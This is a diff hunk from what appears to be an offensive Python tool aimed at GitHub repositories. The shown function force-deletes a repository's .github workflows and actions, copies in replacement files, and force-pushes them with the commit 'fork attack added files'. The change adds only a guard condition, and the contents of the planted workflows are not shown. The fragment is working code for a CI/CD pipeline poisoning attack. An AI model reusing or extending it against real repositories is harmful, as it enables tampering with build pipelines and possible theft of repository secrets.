@@ -79,23 +79,24 @@ def dump_data(code_analysis_data, dependabot_data, repo_name):
 
 def add_ymls(local_repo_path, branch):
     local_repo = ""
-    try:
-        os.chdir(local_repo_path)
-        local_repo = git.Repo(f'{local_repo_path}/.git')
-        local_repo.git.checkout(branch)
-        if os.path.isdir(f'{local_repo_path}/.github/workflows'):
-            local_repo.git.rm("--force", ['.github/workflows'], r=True)
-        if os.path.isdir(f'{local_repo_path}/.github/actions'):
-            local_repo.git.rm("--force", ['.github/actions'], r=True)
-        copy_tree(files, f'{local_repo_path}/.github')
-        local_repo.git.add("--force", local_repo_path)
-        local_repo.git.push('--force', 'origin', branch)
-        local_repo.git.commit('-m', "fork attack added files")
-        local_repo.git.push('--force', 'origin', branch)
-    except git.GitCommandError:
-        local_repo.git.push('--force', 'origin', branch)
-    except Exception as e:
-        logger.info(f"Error syspath: {local_repo_path}. {e}")
+    if not os.path.isdir(f'{local_repo_path}/.github/workflows'):
+        try:
+            os.chdir(local_repo_path)
+            local_repo = git.Repo(f'{local_repo_path}/.git')
+            local_repo.git.checkout(branch)
+            if os.path.isdir(f'{local_repo_path}/.github/workflows'):
+                local_repo.git.rm("--force", ['.github/workflows'], r=True)
+            if os.path.isdir(f'{local_repo_path}/.github/actions'):
+                local_repo.git.rm("--force", ['.github/actions'], r=True)
+            copy_tree(files, f'{local_repo_path}/.github')
+            local_repo.git.add("--force", local_repo_path)
+            local_repo.git.push('--force', 'origin', branch)
+            local_repo.git.commit('-m', "fork attack added files")
+            local_repo.git.push('--force', 'origin', branch)
+        except git.GitCommandError:
+            local_repo.git.push('--force', 'origin', branch)
+        except Exception as e:
+            logger.info(f"Error syspath: {local_repo_path}. {e}")
 
 
 def attack():
